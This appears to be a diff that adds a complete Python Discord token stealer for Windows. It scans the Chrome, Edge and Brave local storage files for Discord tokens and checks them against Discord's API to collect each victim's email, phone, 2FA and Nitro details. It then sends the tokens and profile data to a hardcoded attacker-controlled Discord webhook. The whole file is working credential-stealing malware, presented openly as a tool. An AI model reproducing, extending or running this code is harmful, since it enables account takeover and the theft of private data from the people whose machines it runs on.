@@ -1,0 +1,492 @@
+import base64
+import json
+import os
+import re
+import urllib.request
+import urllib.error
+from pathlib import Path
+import logging
+from typing import Dict, Set, List, Optional, Tuple
+from datetime import datetime, timezone
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,40}"
+REQUEST_HEADERS = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+}
+WEBHOOK_URL = "https://discord.com/api/webhooks/1468625807584002193/kgb9POGoet6SRV-WUD0xGzFKqyShNX42a4ybtutx4l7I8qElNdjNoMbWTNKg6EDcrBfX"
+MAX_FILE_SIZE = 10 * 1024 * 1024
+REQUEST_TIMEOUT = 10 
+
+class TokenGrabber:
+    def __init__(self, webhook_url: str = WEBHOOK_URL):
+        self.webhook_url = webhook_url
+        self.found_tokens: Dict[str, Set[str]] = {}
+        self.user_info_cache: Dict[str, dict] = {}
+        
+    def make_post_request(self, api_url: str, data: dict) -> Tuple[int, str]:
+        if not api_url.startswith(("http://", "https://")):
+            raise ValueError("Invalid URL protocol")
+        
+        try:
+            json_data = json.dumps(data).encode('utf-8')
+            request = urllib.request.Request(
+                api_url, 
+                data=json_data,
+                headers=REQUEST_HEADERS,
+                method='POST'
+            )
+            
+            with urllib.request.urlopen(request, timeout=REQUEST_TIMEOUT) as response:
+                response_data = response.read().decode('utf-8')
+                return response.status, response_data
+                
+        except urllib.error.HTTPError as e:
+            error_msg = f"HTTP Error: {e.code} - {e.reason}"
+            logging.error(error_msg)
+            return e.code, error_msg
+        except urllib.error.URLError as e:
+            error_msg = f"URL Error: {e.reason}"
+            logging.error(error_msg)
+            return -1, error_msg
+        except Exception as e:
+            error_msg = f"Request failed: {str(e)}"
+            logging.error(error_msg)
+            return -1, error_msg
+
+    def make_get_request(self, api_url: str, headers: dict = None, timeout: int = REQUEST_TIMEOUT) -> Optional[dict]:
+        if not api_url.startswith(("http://", "https://")):
+            return None
+        
+        try:
+            request_headers = headers or REQUEST_HEADERS.copy()
+            request = urllib.request.Request(
+                api_url,
+                headers=request_headers,
+                method='GET'
+            )
+            
+            with urllib.request.urlopen(request, timeout=timeout) as response:
+                if response.status == 200:
+                    return json.loads(response.read().decode('utf-8'))
+                else:
+                    logging.debug(f"GET request failed with status: {response.status}")
+                    return None
+                    
+        except urllib.error.HTTPError as e:
+            if e.code != 401:  
+                logging.debug(f"HTTP Error in GET request: {e.code} - {e.reason}")
+            return None
+        except urllib.error.URLError as e:
+            logging.debug(f"URL Error in GET request: {e.reason}")
+            return None
+        except Exception as e:
+            logging.debug(f"GET request failed: {str(e)}")
+            return None
+
+    def get_user_info(self, token: str) -> Optional[dict]:
+        try:
+            headers = {
+                "Authorization": token,
+                "User-Agent": REQUEST_HEADERS["User-Agent"]
+            }
+            user_data = self.make_get_request("https://discord.com/api/v9/users/@me", headers, timeout=5)
+            
+            if user_data:
+                user_info = {
+                    "id": user_data.get("id", "Unknown"),
+                    "username": user_data.get("username", "Unknown"),
+                    "discriminator": user_data.get("discriminator", "0000"),
+                    "global_name": user_data.get("global_name", "Unknown"),
+                    "avatar": user_data.get("avatar", None),
+                    "email": user_data.get("email", "Unknown"),
+                    "phone": user_data.get("phone", "Unknown"),
+                    "verified": user_data.get("verified", False),
+                    "premium_type": user_data.get("premium_type", 0),
+                    "locale": user_data.get("locale", "Unknown"),
+                    "mfa_enabled": user_data.get("mfa_enabled", False),
+                }
+                if user_info["discriminator"] != "0":
+                    user_info["full_username"] = f"{user_info['username']}#{user_info['discriminator']}"
+                else:
+                    user_info["full_username"] = f"@{user_info['username']}"
+            
+                if user_info["avatar"]:
+                    user_info["avatar_url"] = f"https://cdn.discordapp.com/avatars/{user_info['id']}/{user_info['avatar']}.png?size=128"
+                else:
+                    user_info["avatar_url"] = None
+                
+                logging.info(f"Valid token for: {user_info['full_username']}")
+                return user_info
+            else:
+                return None
+                
+        except Exception as e:
+            logging.debug(f"Error getting user info: {str(e)}")
+            return None
+
+    def validate_token(self, token: str) -> Tuple[bool, Optional[dict]]:
+        user_info = self.get_user_info(token)
+        if user_info:
+            return True, user_info
+        return False, None
+
+    def get_tokens_from_file(self, file_path: Path) -> Optional[List[str]]:
+        try:
+            if file_path.stat().st_size > MAX_FILE_SIZE:
+                return None
+                
+            file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
+            tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
+            valid_tokens = [token for token in tokens if self.validate_token_format(token)]
+            
+            return valid_tokens if valid_tokens else None
+            
+        except (PermissionError, FileNotFoundError, OSError) as e:
+            logging.debug(f"Could not read file {file_path}: {str(e)}")
+            return None
+        except Exception as e:
+            logging.error(f"Unexpected error reading file {file_path}: {str(e)}")
+            return None
+
+    def validate_token_format(self, token: str) -> bool:
+        parts = token.split('.')
+        if len(parts) != 3:
+            return False
+            
+        if not (24 <= len(parts[0]) <= 26):
+            return False
+        if len(parts[1]) != 6:
+            return False
+        if not (27 <= len(parts[2]) <= 40):
+            return False
+            
+        return True
+
+    def get_user_id_from_token(self, token: str) -> Optional[str]:
+        try:
+            token_parts = token.split('.', maxsplit=1)
+            if len(token_parts) < 1:
+                return None
+                
+            encoded_part = token_parts[0]
+            
+            padding_needed = 4 - (len(encoded_part) % 4)
+            if padding_needed != 4:
+                encoded_part += '=' * padding_needed
+            
+            decoded_bytes = base64.b64decode(encoded_part, validate=True)
+            discord_user_id = decoded_bytes.decode('utf-8', errors='ignore')
+            
+            if discord_user_id.isdigit() and len(discord_user_id) >= 17:
+                return discord_user_id
+            else:
+                return None
+                
+        except (base64.binascii.Error, UnicodeDecodeError, ValueError):
+            return None
+        except Exception as e:
+            logging.debug(f"Unexpected error decoding token: {str(e)}")
+            return None
+
+    def get_tokens_from_path(self, base_path: Path) -> Dict[str, Dict]:
+        if not base_path.exists() or not base_path.is_dir():
+            logging.error(f"Path does not exist or is not a directory: {base_path}")
+            return {}
+        
+        user_data: Dict[str, Dict] = {}
+        processed_files = 0
+        tokens_found = 0
+        
+        try:
+            file_patterns = ['*.ldb', '*.log', '*.json', '*.txt']
+            file_paths = []
+            
+            for pattern in file_patterns:
+                file_paths.extend(base_path.glob(pattern))
+                file_paths.extend(base_path.glob(f"*/{pattern}"))
+            
+            file_paths = list(set([p for p in file_paths if p.is_file()]))
+            
+            logging.info(f"Scanning {len(file_paths)} files in {base_path}...")
+            
+            for file_path in file_paths:
+                potential_tokens = self.get_tokens_from_file(file_path)
+                processed_files += 1
+
+                if potential_tokens is None:
+                    continue
+
+                for potential_token in potential_tokens:
+                    tokens_found += 1
+                    discord_user_id = self.get_user_id_from_token(potential_token)
+
+                    if discord_user_id is None:
+                        continue
+
+                    if discord_user_id not in user_data:
+                        user_data[discord_user_id] = {
+                            'tokens': set(),
+                            'info': None,
+                            'valid_tokens': []
+                        }
+
+                    user_data[discord_user_id]['tokens'].add(potential_token)
+                    
+            if user_data:
+                self._validate_and_enrich_user_data(user_data)
+                    
+            logging.info(f"Processed {processed_files} files, found {tokens_found} tokens for {len(user_data)} users")
+                    
+        except Exception as e:
+            logging.error(f"Error scanning path {base_path}: {str(e)}")
+            
+        return user_data
+
+    def _validate_and_enrich_user_data(self, user_data: Dict[str, Dict]) -> None:
+        total_users = len(user_data)
+        current_user = 0
+        
+        for user_id, data in user_data.items():
+            current_user += 1
+            valid_tokens = []
+            user_info = None
+            
+            logging.info(f"Validating tokens for user {current_user}/{total_users} ({user_id})...")
+            for token in data['tokens']:
+                is_valid, info = self.validate_token(token)
+                if is_valid and info:
+                    valid_tokens.append(token)
+                    if not user_info:
+                        user_info = info
+            
+            data['valid_tokens'] = valid_tokens
+            data['info'] = user_info
+            
+            if user_info:
+                logging.info(f"Valid user: {user_info['full_username']}")
+            else:
+                logging.info(f"No valid tokens for user {user_id}")
+
+    def send_tokens_to_webhook(self, user_data: Dict[str, Dict]) -> bool:
+        if not user_data:
+            logging.info("No tokens to send")
+            return True 
+            
+        try:
+            embeds = []
+            valid_users_count = 0
+            
+            for user_id, data in user_data.items():
+                user_info = data.get('info', {})
+                valid_tokens = data.get('valid_tokens', [])
+                all_tokens = list(data.get('tokens', set()))
+                
+                if user_info:
+                    valid_users_count += 1
+                    embed = {
+                        "title": f"{user_info.get('full_username', 'Unknown User')}",
+                        "color": 0x849989 if valid_tokens else 0x849989,
+                        "fields": [
+                            {
+                                "name": "User ID",
+                                "value": f"`{user_id}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "Email",
+                                "value": f"`{user_info.get('email', 'Unknown')}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "Verified",
+                                "value": "Yes" if user_info.get('verified') else "No",
+                                "inline": True
+                            },
+                            {
+                                "name": "2FA",
+                                "value": "Enabled" if user_info.get('mfa_enabled') else "Disabled",
+                                "inline": True
+                            },
+                            {
+                                "name": "Nitro",
+                                "value": self._get_nitro_type(user_info.get('premium_type', 0)),
+                                "inline": True
+                            }
+                        ],
+                        "footer": {
+                            "text": f"Valid tokens: {len(valid_tokens)} | Total tokens: {len(all_tokens)}"
+                        },
+                        "timestamp": datetime.now(timezone.utc).isoformat()
+                    }
+                    
+                    if user_info.get('avatar_url'):
+                        embed["thumbnail"] = {"url": user_info['avatar_url']}
+
+                    if valid_tokens:
+                        token_text = "\n".join([f"||`{token}`||" for token in valid_tokens[:3]])  # Show first 3 tokens
+                        if len(valid_tokens) > 3:
+                            token_text += f"\n... and {len(valid_tokens) - 3} more valid tokens"
+                        embed["fields"].append({
+                            "name": "Valid Tokens",
+                            "value": token_text,
+                            "inline": False
+                        })
+                    
+                    if all_tokens:
+                        all_tokens_text = "\n".join([f"`{token}`" for token in all_tokens[:2]])
+                        if len(all_tokens) > 2:
+                            all_tokens_text += f"\n... and {len(all_tokens) - 2} more"
+                        embed["fields"].append({
+                            "name": "All Tokens Found",
+                            "value": all_tokens_text,
+                            "inline": False
+                        })
+                    
+                else:
+                    embed = {
+                        "title": "Unknown User (No Valid Tokens)",
+                        "color": 0x849989,
+                        "fields": [
+                            {
+                                "name": "User ID",
+                                "value": f"`{user_id}`",
+                                "inline": True
+                            },
+                            {
+                                "name": "Tokens Found",
+                                "value": str(len(all_tokens)),
+                                "inline": True
+                            }
+                        ],
+                        "footer": {
+                            "text": "No valid tokens - all tokens are expired/invalid"
+                        },
+                        "timestamp": datetime.now(timezone.utc).isoformat()
+                    }
+                
+                embeds.append(embed)
+            
+            total_users = len(user_data)
+            content = f"**Token Grabber By l1nknotavailable**\n**Total Users:** {total_users} | **Valid Users:** {valid_users_count} | **Invalid Users:** {total_users - valid_users_count}"
+            if embeds:
+                data = {
+                    "content": content,
+                    "embeds": embeds[:10] 
+                }
+                
+                status, response = self.make_post_request(self.webhook_url, data)
+                if status == 200:
+                    logging.info("Successfully sent data to webhook")
+                    return True
+                else:
+                    logging.error(f"Failed to send to webhook: HTTP {status} - {response}")
+                    return False
+            else:
+                logging.info("No embeds to send")
+                return True
+                
+        except Exception as e:
+            logging.error(f"Failed to send tokens to webhook: {str(e)}")
+            return False
+
+    def _get_nitro_type(self, premium_type: int) -> str:
+        nitro_types = {
+            0: "None",
+            1: "Nitro Classic",
+            2: "Nitro",
+            3: "Nitro Basic"
+        }
+        return nitro_types.get(premium_type, "Unknown")
+
+    def scan_multiple_browsers(self) -> Dict[str, Dict]:
+        browsers = {
+            "Chrome": Path(os.getenv("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data",
+            "Edge": Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data",
+            "Brave": Path(os.getenv("LOCALAPPDATA", "")) / "BraveSoftware" / "Brave-Browser" / "User Data",
+        }
+        
+        all_user_data: Dict[str, Dict] = {}
+        browsers_scanned = 0
+        
+        for browser_name, browser_path in browsers.items():
+            if browser_path.exists():
+                logging.info(f"Scanning {browser_name}...")
+                browsers_scanned += 1
+                profile_paths = []
+                default_path = browser_path / "Default" / "Local Storage" / "leveldb"
+                if default_path.exists():
+                    profile_paths.append(default_path)
+                for profile_dir in browser_path.glob("Profile */Local Storage/leveldb"):
+                    if profile_dir.is_dir():
+                        profile_paths.append(profile_dir)
+                
+                for profile_dir in browser_path.glob("System Profile/Local Storage/leveldb"):
+                    if profile_dir.is_dir():
+                        profile_paths.append(profile_dir)
+                
+                for profile_path in profile_paths:
+                    user_data = self.get_tokens_from_path(profile_path)
+                    self._merge_user_data(all_user_data, user_data)
+        
+        logging.info(f"Scanned {browsers_scanned} browsers, found {len(all_user_data)} unique users")
+        return all_user_data
+
+    def _merge_user_data(self, main_dict: Dict[str, Dict], new_dict: Dict[str, Dict]) -> None:
+        for user_id, new_data in new_dict.items():
+            if user_id in main_dict:
+                main_dict[user_id]['tokens'].update(new_data['tokens'])
+                if not main_dict[user_id]['info'] and new_data['info']:
+                    main_dict[user_id]['info'] = new_data['info']
+                existing_tokens = set(main_dict[user_id]['valid_tokens'])
+                existing_tokens = set(main_dict[user_id]['valid_tokens'])
+                new_valid_tokens = [t for t in new_data['valid_tokens'] if t not in existing_tokens]
+                main_dict[user_id]['valid_tokens'].extend(new_valid_tokens)
+            else:
+                main_dict[user_id] = new_data
+
+    def run(self) -> None:
+        try:
+            all_user_data = self.scan_multiple_browsers()
+            
+            if all_user_data:
+                valid_users = sum(1 for data in all_user_data.values() if data['valid_tokens'])
+                total_tokens = sum(len(data['tokens']) for data in all_user_data.values())
+                valid_tokens = sum(len(data['valid_tokens']) for data in all_user_data.values())
+                
+                #logging.info(f"📊 Summary: {len(all_user_data)} users, {valid_users} valid, {total_tokens} total tokens, {valid_tokens} valid tokens")
+                
+                success = self.send_tokens_to_webhook(all_user_data)
+                
+                if success:
+                    logging.info("Data successfully sent to webhook")
+                else:
+                    logging.error("Failed to send data to webhook")
+            else:
+                logging.info("No Discord tokens found in any browser")
+                
+        except Exception as e:
+            logging.error(f"Critical error in main execution: {str(e)}")
+
+def main() -> None:
+    try:
+        if os.name != 'nt':
+            logging.error("This script is designed for Windows systems only")
+            return
+            
+        local_app_data = os.getenv("LOCALAPPDATA")
+        if not local_app_data:
+            logging.error("LOCALAPPDATA environment variable not found")
+            return
+            
+        grabber = TokenGrabber()
+        grabber.run()
+        
+    except KeyboardInterrupt:
+        logging.info("Execution interrupted by user")
+    except Exception as e:
+        logging.error(f"Unexpected error in main: {str(e)}")
+
+if __name__ == "__main__":
+    main()
